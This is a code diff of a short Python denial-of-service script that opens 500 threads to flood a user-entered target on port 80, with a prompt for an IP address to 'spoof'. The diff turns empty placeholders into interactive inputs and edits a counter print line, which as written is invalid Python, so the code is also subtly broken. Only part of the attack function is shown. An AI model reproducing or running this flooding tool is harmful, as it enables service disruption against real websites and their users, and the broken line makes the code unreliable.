@@ -1,9 +1,9 @@
 import threading
 import socket
 
-target = ''
-port = ''
-fake_ip = ''
+target = input("Enter a target: ")
+port = 80
+fake_ip = input("Enter an ip to 'spoof': ")
 
 already_connected = 0
 
@@ -18,7 +18,7 @@ def attack():
         global already_connected
         already_connected += 1
         if already_connected % 500 == 0:
-            print(already_connected)
+            print("hit: "already_connected)
 
 for i in range(500):
     thread = threading.Thread(target=attack)
